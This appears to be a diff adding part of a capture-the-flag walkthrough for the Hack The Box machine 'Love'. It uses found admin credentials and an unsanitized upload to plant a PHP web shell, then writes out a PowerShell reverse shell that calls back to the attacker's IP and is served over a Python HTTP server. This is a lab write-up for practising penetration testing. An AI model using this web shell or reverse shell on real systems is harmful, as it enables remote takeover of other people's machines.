@@ -176,6 +176,62 @@ You should try to hit all ports you got back from nmap uding this, you'll get a 
 We got creds admin:@LoveIsInTheAir!!!!
 <img width="912" height="526" alt="image" src="https://github.com/user-attachments/assets/6ff88fa8-9d4b-4e45-9261-7ee0a13d0cb6" />
 
+Test the credentials over at http://love.htb/admin:
+<img width="600" height="546" alt="image" src="https://github.com/user-attachments/assets/0ed41aa6-6336-4ba8-ac3d-1f68949c77ed" />
+
+Here click on the update button:
+<img width="282" height="277" alt="image" src="https://github.com/user-attachments/assets/c0eccd64-613b-4c71-8451-1ef9d4d4daca" />
+
+See the browse button. It allows us to upload images. But the site has no sanitization, so we are going to use it to upload a .php shell.
+<img width="600" height="467" alt="image" src="https://github.com/user-attachments/assets/e8486b60-6f2f-43d6-9980-290cc686f310" />
+
+Create a file called cmd.php and copy-paste the following into it:
+````
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+````
+
+Next upload cmd.php into the website:
+<img width="605" height="467" alt="image" src="https://github.com/user-attachments/assets/94b0d79b-2f6e-4e8b-ae0b-17faf0423b5c" />
+
+And access it via the browser at http://love.htb/images/cmd.php. Images is the folder that all images are stored, by calling cmd.php inside it we can call our php shell:
+<img width="1917" height="447" alt="image" src="https://github.com/user-attachments/assets/de181700-65d9-438d-83f9-35ee25ac8651" />
+
+Try whoami to cofirm coomand execution and realize we are operating as phoebe:
+<img width="1917" height="340" alt="image" src="https://github.com/user-attachments/assets/7e521fa9-afa9-49d5-a89b-db6e201c825e" />
+
+Now, we could actually read the user.txt from here. But Let's get a better shell:
+Copy-paste the following into a file named shell.ps1, just change <your-ip> to your tun0 ip:
+````
+$client = New-Object System.Net.Sockets.TCPClient('<your-ip>',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+````
+
+Then create a www directory, move shell.ps1 into it and open a simple python server inside it:
+````
+mkdir www
+mv shell.ps1 www
+cd www
+python -m http.server
+````
+
+
+
+
 
 
 
